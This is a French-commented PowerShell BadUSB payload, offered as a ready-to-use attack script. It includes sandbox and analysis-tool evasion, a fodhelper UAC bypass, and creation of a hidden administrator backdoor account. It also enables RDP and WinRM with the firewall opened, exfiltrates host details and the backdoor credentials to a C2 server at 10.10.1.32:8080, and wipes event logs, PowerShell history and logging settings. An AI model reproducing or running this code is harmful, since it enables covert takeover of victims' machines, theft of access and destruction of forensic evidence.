# ==============================================================
# payload_final.ps1 – Charge utile BadUSB (version combinée)
# 
# Fonctionnalités :
#   1. Anti-sandbox (détection VM/outils d'analyse)
#   2. Élévation UAC automatique via fodhelper (sans interaction)
#   3. Création compte administrateur aléatoire (svc_XXXXXX)
#   4. Activation RDP et WinRM
#   5. Exfiltration vers serveur C2 (POST /collect, fallback /b64)
#   6. Nettoyage complet des traces (logs, historique, prefetch)
#
# Utilisation : exécuter en PowerShell (même utilisateur standard)
# ==============================================================

$ErrorActionPreference = "SilentlyContinue"

# ──────────────────────────────────────────────────────────────
# 1. ANTI‑SANDBOX (détection VMware/VirtualBox, outils analyse)
# ──────────────────────────────────────────────────────────────

function Test-Sandbox {
    $vmProcs = @("vmtoolsd","vmwaretray","vmwareuser","vmacthlp",
                 "vboxservice","vboxtray","vgauthservice",
                 "vmnat","vmnetdhcp","vmware-vmx")
    foreach ($p in $vmProcs) {
        if (Get-Process -Name $p -EA 0) { return $true }
    }
    $analysisProcs = @("procmon","procmon64","processhacker","procexp","procexp64",
                       "wireshark","fiddler","charles","burpsuite",
                       "ollydbg","x64dbg","x32dbg","ida","ida64",
                       "immunitydebugger","windbg","pestudio","die")
    foreach ($p in $analysisProcs) {
        if (Get-Process -Name $p -EA 0) { return $true }
    }
    $ram = (Get-CimInstance Win32_ComputerSystem -EA 0).TotalPhysicalMemory
    if ($ram -and $ram -lt 2GB) { return $true }
    $cores = (Get-CimInstance Win32_Processor -EA 0).NumberOfLogicalProcessors
    if ($cores -and $cores -lt 2) { return $true }
    $diskTotal = (Get-CimInstance Win32_DiskDrive -EA 0 | Measure-Object -Property Size -Sum).Sum
    if ($diskTotal -and $diskTotal -lt 50GB) { return $true }
    $vmRegKeys = @("HKLM:\SOFTWARE\VMware, Inc.\VMware Tools",
                   "HKLM:\SOFTWARE\Oracle\VirtualBox Guest Additions",
                   "HKLM:\SYSTEM\CurrentControlSet\Services\VBoxGuest")
    foreach ($k in $vmRegKeys) {
        if (Test-Path $k) { return $true }
    }
    return $false
}

if (Test-Sandbox) { exit }
Start-Sleep -Milliseconds 800

# ──────────────────────────────────────────────────────────────
# 2. CONTOURNEMENT UAC VIA FODHELPER (élève automatiquement)
# ──────────────────────────────────────────────────────────────

function Test-Admin {
    $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = [Security.Principal.WindowsPrincipal]$identity
    return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

if (-not (Test-Admin)) {
    # Récupère le chemin complet de ce script
    $selfPath = $MyInvocation.MyCommand.Path
    $elevCmd = "powershell.exe -WindowStyle Hidden -NonInteractive -ExecutionPolicy Bypass -NoProfile -File `"$selfPath`""
    # Création de la clé registre pour fodhelper
    $regPath = "HKCU:\Software\Classes\ms-settings\shell\open\command"
    New-Item -Path $regPath -Force | Out-Null
    New-ItemProperty -Path $regPath -Name "DelegateExecute" -Value "" -Force | Out-Null
    Set-ItemProperty -Path $regPath -Name "(default)" -Value $elevCmd -Force | Out-Null
    # Déclenchement de fodhelper (s'élève silencieusement)
    Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
    Start-Sleep -Seconds 3
    # Nettoyage de la clé temporaire
    Remove-Item "HKCU:\Software\Classes\ms-settings" -Recurse -Force -ErrorAction SilentlyContinue
    exit
}

# À partir d'ici, le script tourne avec droits administrateur
Write-Host "[+] Droits administrateur obtenus."

# ──────────────────────────────────────────────────────────────
# 3. CRÉATION DU COMPTE ADMINISTRATEUR CACHÉ (aléatoire)
# ──────────────────────────────────────────────────────────────

$charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
$suffix = -join ($charset.ToCharArray() | Get-Random -Count 6)
$backdoorUser = "svc_" + $suffix
$pwChars = $charset + "!@#$%^&*()-_=+"
$backdoorPass = -join ($pwChars.ToCharArray() | Get-Random -Count 18)

net user $backdoorUser $backdoorPass /add /expires:never /passwordreq:yes /comment:"Service Account" 2>&1 | Out-Null
net localgroup Administrators $backdoorUser /add 2>&1 | Out-Null
net localgroup "Remote Desktop Users" $backdoorUser /add 2>&1 | Out-Null
wmic useraccount where "Name='$backdoorUser'" set PasswordExpires=FALSE 2>&1 | Out-Null

$loginHideKey = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"
New-ItemProperty -Path $loginHideKey -Name $backdoorUser -Value 0 -PropertyType DWORD -Force 2>&1 | Out-Null

Write-Host "[+] Compte administrateur masqué créé : $backdoorUser"

# ──────────────────────────────────────────────────────────────
# 4. ACTIVATION ACCÈS DISTANT (RDP + WinRM)
# ──────────────────────────────────────────────────────────────

Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0 -Force
Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Name "UserAuthentication" -Value 0 -Force
Enable-NetFirewallRule -DisplayGroup "Remote Desktop" 2>&1 | Out-Null

Enable-PSRemoting -Force -SkipNetworkProfileCheck 2>&1 | Out-Null
Set-Item WSMan:\localhost\Client\TrustedHosts -Value "*" -Force 2>&1 | Out-Null
Set-Service WinRM -StartupType Automatic 2>&1 | Out-Null
Start-Service WinRM 2>&1 | Out-Null

netsh advfirewall firewall add rule name="BackdoorRemoteAccess" protocol=TCP dir=in localport=3389,5985,5986 action=allow profile=any 2>&1 | Out-Null

Write-Host "[+] RDP et WinRM activés."

# ──────────────────────────────────────────────────────────────
# 5. COLLECTE ET EXFILTRATION VERS SERVEUR C2 (IP à modifier)
# ──────────────────────────────────────────────────────────────

$publicIP = "Inconnue"
$ipServices = @("https://api.ipify.org","https://checkip.amazonaws.com","https://icanhazip.com")
foreach ($svc in $ipServices) {
    try {
        $publicIP = (Invoke-WebRequest -Uri $svc -UseBasicParsing -TimeoutSec 5).Content.Trim()
        if ($publicIP -match '^\d{1,3}(\.\d{1,3}){3}$') { break }
    } catch {}
}

$localIP = (Get-NetIPAddress -AddressFamily IPv4 -EA 0 | Where-Object { $_.InterfaceAlias -notlike "*Loopback*" } | Select-Object -First 1).IPAddress

$sysInfo = @{
    computer_name = $env:COMPUTERNAME
    domain        = $env:USERDOMAIN
    current_user  = $env:USERNAME
    os_version    = (Get-CimInstance Win32_OperatingSystem -EA 0).Caption
    local_ip      = $localIP
    public_ip     = $publicIP
    backdoor_user = $backdoorUser
    backdoor_pass = $backdoorPass
    rdp_port      = 3389
    winrm_port    = 5985
    timestamp     = (Get-Date -Format "yyyy-MM-dd HH:mm:ss")
}

$jsonData = $sysInfo | ConvertTo-Json -Compress

# --- Remplacer par l'IP de votre serveur C2 (Kali) ---
$c2Base = "http://10.10.1.32:8080"

# Envoi principal (POST /collect)
$sent = $false
try {
    $resp = Invoke-WebRequest -Uri "$c2Base/collect" -Method POST -Body $jsonData -ContentType "application/json" -UseBasicParsing -TimeoutSec 8
    if ($resp.StatusCode -eq 200) { $sent = $true }
} catch {}

# Fallback Base64 vers /b64
if (-not $sent) {
    try {
        $b64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($jsonData))
        $null = Invoke-WebRequest -Uri "$c2Base/b64?d=$b64" -UseBasicParsing -TimeoutSec 8
    } catch {}
}

Write-Host "[+] Exfiltration tentée vers $c2Base"

# ──────────────────────────────────────────────────────────────
# 6. NETTOYAGE DES TRACES
# ──────────────────────────────────────────────────────────────

foreach ($log in @("System","Application","Security","Windows PowerShell","Microsoft-Windows-PowerShell/Operational")) {
    wevtutil cl "$log" 2>&1 | Out-Null
}
$histFile = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
if (Test-Path $histFile) { Remove-Item $histFile -Force }
Remove-Item "C:\Windows\Prefetch\POWERSHELL*" -Force -ErrorAction SilentlyContinue
$psLogKey = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell"
Set-ItemProperty -Path "$psLogKey\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 0 -Force
Set-ItemProperty -Path "$psLogKey\Transcription" -Name "EnableTranscripting" -Value 0 -Force

Write-Host "[+] Payload final terminé avec succès."
